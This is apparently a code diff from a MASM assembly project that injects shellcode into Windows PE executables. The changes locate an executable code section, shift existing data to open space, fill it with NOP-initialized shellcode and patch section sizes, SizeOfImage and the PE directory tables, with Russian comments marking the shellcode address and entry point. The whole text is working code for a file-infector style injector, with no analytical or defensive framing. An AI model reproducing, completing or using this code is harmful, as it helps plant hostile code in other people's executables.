@@ -157,7 +157,6 @@ HandleImportTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
 HandleExportTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
 HandleExceptionTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
 HandleDebugTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
-HandleLoadConfTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
 HandleRelocs proto CurrentStdcallNotation :cword, :cword, :dword, :dword
 FindTargetSection proto CurrentStdcallNotation :cword
 
@@ -317,7 +316,7 @@ INJECTION_SIGN 	equ 050h
     mov [VAsc], eax
 
     mov eax, [cdx].IMAGE_SECTION_HEADER.PointerToRawData
-    add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    add eax, [cdx].IMAGE_SECTION_HEADER.SizeOfRawData
     mov [RawAddrSc], eax
 
     mov [targetSection], cdx
@@ -351,13 +350,6 @@ INJECTION_SIGN 	equ 050h
     ;DbgBreak
     invoke HandleAllTables, [pe], [VAsc], [globalSCSize], eax
 
-    mov cdi, [pe]
-    mov cdi, [cdi].PeHeaders.nthead
-    lea cdi, [cdi].IMAGE_NT_HEADERS.OptionalHeader
-    mov ecx, [allignScSize]
-    add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfImage, ecx
-    add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfCode, ecx
-    add [cdi].IMAGE_OPTIONAL_HEADER.BaseOfData, ecx
     ; сдвигаем все, что ниже
 
     invoke UnloadPeFile, [pe]
@@ -383,7 +375,7 @@ INJECTION_SIGN 	equ 050h
     mov cdi, [cdx].PeHeaders.mem
     
     ; адрес в памяти, где будет шеллкод
-    ;DbgBreak
+    DbgBreak
     xor ccx, ccx
     mov ecx, [RawAddrSc]
     add ccx, cdi
@@ -413,15 +405,19 @@ INJECTION_SIGN 	equ 050h
     mov [sizeMovedData], ccx
     
     invoke sc_memmove, cdi, csi, [sizeMovedData]
-    ;invoke sc_memset, [pSC], 090h, [globalSCSize]
+    invoke sc_memset, [pSC], 090h, [globalSCSize]
 
-    ;DbgBreak
     mov ccx, [targetSection]
     mov eax, [globalSCSize]
     add dword ptr [ccx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
-    mov eax, totalEnd - start
+    mov eax, [allignScSize]
     add dword ptr [ccx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax
 
+    mov eax, [allignScSize]
+    mov cdx, [pe]
+    mov cdx, [cdx].PeHeaders.nthead
+    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
+    add [cdx].IMAGE_OPTIONAL_HEADER.SizeOfImage, eax 
     
     ; точка вход
     ;add [cdx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax
@@ -452,8 +448,7 @@ FindTargetSection proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword
     .while ecx < [cdi].PeHeaders.countSec
         ;DbgBreak
         .if ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_CNT_CODE) && \
-            ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_MEM_EXECUTE && \
-            !([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA))
+            ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_MEM_EXECUTE)
 
             mov cax, cdx
             
@@ -513,9 +508,6 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
                 invoke HandleDebugTable, [pe], csi, [scRVA], eax, [allignScSize]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_BASERELOC
                 invoke HandleRelocs, [pe], csi, [scRVA], [allignScSize]
-            .elseif [i] == IMAGE_LOAD_CONFIG_DIRECTORY
-                invoke AlignToTop, [scSize], [fileAligment]
-                invoke HandleLoadConfTable, [pe], csi, [scRVA], eax, [allignScSize]
             .endif
             
             mov eax, [allignScSize]
@@ -555,54 +547,6 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
 
     ret
 HandleAllTables endp
-
-HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT:cword, scRVA:dword, scSize:dword, allignScSize:dword
-
-    local pBase:cword
-    local ib:cword
-    local i:cword
-
-    ifdef _WIN64
-		mov [rbp + 10h], rcx
-		mov [rbp + 18h], rdx
-		mov [rbp + 20h], r8
-		mov [rbp + 28h], r9
-	endif
-
-    mov cdi, [pe]
-    mov ccx, [pe].PeHeaders.nthead
-    lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
-    mov ccx, [ccx].IMAGE_OPTIONAL_HEADER.ImageBase
-    mov [ib], ccx
-
-    mov cdi, [pe].PeHeaders.mem
-    mov [pBase], cdi
-
-    mov cdi, [pILCT]
-    .if [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable != 0
-        mov ccx, [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable
-        sub ccx, [ib]
-        invoke RvaToOffset, ccx, [pe]
-        mov edx, [scRVA]
-        mov ecx, [allignScSize]
-        xor ecx, ecx
-        mov [i], ccx
-        .while ccx < [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerCount
-            mov ecx, [allignScSize]
-            .if [cax] >= cdx
-                add [cax], ccx
-            .endif
-            add cax, sizeof(cword)
-            
-            inc [i]
-            mov ccx, [i]
-        .endw
-    .endif
-
-    
-
-    ret
-HandleLoadConfTable endp
 
 HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, scRVA:dword, allignScSize:dword
 
